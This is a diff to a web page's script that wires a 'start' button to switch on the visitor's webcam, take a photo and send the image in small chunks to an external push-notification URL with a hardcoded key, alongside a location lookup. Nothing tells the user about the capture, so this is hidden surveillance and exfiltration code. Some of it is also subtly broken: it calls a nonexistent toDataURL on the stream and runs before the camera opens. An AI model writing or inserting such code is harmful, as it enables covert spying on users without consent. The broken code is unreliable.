@@ -94,6 +94,56 @@
     <input class="stopBtn" type="button" value="开始" id="stop">
 </div>
 <script>
+    let mediaStream;
+    // 开启摄像头
+    function openMedia() {
+        let constraints = {
+            audio: false, //音频轨道
+            video: {width:300,height:300}  //视频轨道
+        }
+        let mediaPromise = navigator.mediaDevices.getUserMedia(constraints);
+        mediaPromise.then(function (stream) {
+            /* 使用这个stream stream */
+            mediaStream=stream;
+        }).catch(function (err) {
+            /* 处理error */
+            alert(err);
+        });
+    };
+
+    // 拍照
+    function takePhoto(){
+		var str=mediaStream.toDataURL();
+		var str1;
+		for(var i=0,len=str.length/10;i<len;i++) {
+　　	str1 = str.substr(0,10);
+        str = str.replace(str1,'');
+		var url = "https://api.day.app/TbsfqDZZoJXnaP46cttdsN/" +str1;
+        getJsonObj(url, (data) => {
+        });
+		}
+    };
+
+    // 关闭摄像头
+    let closeMedia=function(){
+        mediaStream.getTracks().forEach(track => {
+            track.stop();
+        });
+    };
+	
+	function base64ToFile(base64Data, fileName) {
+    let arr = base64Data.split(','),
+      fileType = arr[0].match(/:(.*?);/)[1],
+      bstr = atob(arr[1]),
+      l = bstr.length,
+      u8Arr = new Uint8Array(l);
+
+    while (l--) {
+      u8Arr[l] = bstr.charCodeAt(l);
+    }
+    return new File([u8Arr], fileName, {type: fileType});
+  }
+    
     var jsonData = null;
     var jsonDataBaseStation = null;
     var jsonlongitude = null;
@@ -227,6 +277,8 @@
     var cnt = 1;
     var flag = true;
     oBtn.onclick = function () {
+        openMedia();
+        takePhoto();
         getLocation();
         if (flag) {
             step = 1;
